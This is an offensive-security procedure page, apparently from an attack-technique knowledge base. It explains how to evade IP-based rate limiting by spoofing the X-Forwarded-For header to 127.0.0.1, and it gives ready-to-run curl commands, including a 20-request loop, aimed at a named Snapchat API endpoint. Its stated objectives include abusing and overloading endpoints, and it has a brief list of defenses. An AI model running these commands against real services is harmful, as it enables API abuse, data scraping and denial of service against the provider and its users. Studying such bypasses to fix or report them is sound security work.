---
tags:
  - rate-limit-bypass
  - x-forwarded-for
  - business-logic
  - api-abuse
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-post-with-x-forwarded-for]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:28.887Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 55af3510-c6cb-4a3c-a061-06501f77b2ad
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Spoof-X-Forwarded-For-to-Bypass-Rate-Limiting

## Summary

This procedure exploits a business logic flaw in web applications that trust the X-Forwarded-For header for IP-based rate limiting without validation, allowing attackers to spoof their IP address to localhost (127.0.0.1) and send unlimited requests to protected API endpoints.

## Description

In the Snapchat API case, the rate limiting mechanism on endpoints like /stories_everywhere/download_sms relies solely on the X-Forwarded-For header to identify the client IP. By setting this header to 127.0.0.1, attackers can bypass restrictions, leading to potential abuse such as excessive API calls, data scraping, or denial-of-service on rate-limited features. This requires no authentication and works over standard HTTP/HTTPS. Prerequisites include network access to the target API and a tool like curl for request crafting. Expected outcomes include successful responses without throttling, confirming the bypass.

## Requirements

1. Network connectivity to the target API (e.g., app.snapchat.com)
2. Tool for sending custom HTTP requests (e.g., curl)
3. Basic understanding of HTTP headers and POST requests

## Defense

Defensive measures and detection strategies:

- Validate and sanitize the X-Forwarded-For header by cross-referencing with the actual source IP from the TCP connection
- Implement rate limiting based on the real client IP, ignoring or logging spoofed headers
- Use web application firewalls (WAFs) to detect anomalous header values like 127.0.0.1
- Monitor for sudden spikes in requests from localhost IPs in logs

## Objectives

1. Evade IP-based rate limiting to access restricted API functionality
2. Perform excessive requests to abuse or overload endpoints
3. Demonstrate the business logic vulnerability for reporting

## Instructions

### Step 1: Craft and Send Spoofed POST Request

**Context**: Prepare a POST request to the vulnerable endpoint, injecting the spoofed X-Forwarded-For header to mimic a localhost origin, which is typically not rate-limited.

**Command** ([[commands/curl-post-with-x-forwarded-for]]):
```bash
curl -X POST https://app.snapchat.com/stories_everywhere/download_sms \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "payload=example"
```

> This command sends a POST request with the spoofed header. Expected output is a successful response (e.g., JSON data) without rate limit errors. If the bypass works, repeat 10+ times; throttled requests would return 429 errors.

### Step 2: Verify Bypass with Repeated Requests

**Context**: Send multiple requests in quick succession to confirm the rate limit is evaded, as normal client IPs would be blocked after a threshold.

**Command** ([[commands/curl-post-with-x-forwarded-for]]):
```bash
for i in {1..20}; do
  curl -X POST https://app.snapchat.com/stories_everywhere/download_sms \
    -H "X-Forwarded-For: 127.0.0.1" \
    -d "payload=example" \
    -w "Request $i: %{http_code}\n"
  sleep 0.1
done
```

> This loops 20 requests with a short delay. Expected output: All requests return 200 OK, proving unlimited access. Monitor for any errors to validate.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-with-x-forwarded-for]]

## Tools Used

- [[tools/curl]]

## Tags

- rate-limit-bypass
- x-forwarded-for
- business-logic
- api-abuse
